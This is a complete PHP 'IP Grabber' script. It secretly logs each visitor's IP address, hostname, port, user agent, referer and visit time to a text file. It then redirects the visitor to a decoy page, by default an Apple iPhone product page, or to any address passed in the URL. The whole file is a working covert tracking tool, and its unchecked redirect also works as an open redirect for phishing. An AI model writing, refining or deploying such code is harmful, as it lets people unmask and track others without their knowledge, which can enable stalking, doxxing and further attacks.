<?php
//IP Grabber
//Variables

$protocol = $_SERVER['SERVER_PROTOCOL'];
$ip = $_SERVER['REMOTE_ADDR'];
$port = $_SERVER['REMOTE_PORT'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$ref = $_SERVER['HTTP_REFERER'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$time = $_SERVER['REQUEST_TIME'];


if (!isset($_GET['url'])){
    $url = "https://www.apple.com/iphone-11-pro/";
}else{
    $url = $_GET['url'];
}
//Print IP, Hostname, Port Number, User Agent and Referer To Log.TXT

$fh = fopen('log.txt', 'a');
fwrite($fh, 'IP Address: '."".$ip ."\n");
fwrite($fh, 'Hostname: '."".$hostname ."\n");
fwrite($fh, 'Port Number: '."".$port ."\n");
fwrite($fh, 'User Agent: '."".$agent ."\n");
fwrite($fh, 'HTTP Referer: '."".$ref ."\n");
fwrite($fh, 'Time:'."".$time."\n");
fwrite($fh, 'Refered to:'."".$url."\n\n");
fclose($fh);
header('Location: '.$url);
exit;
?>
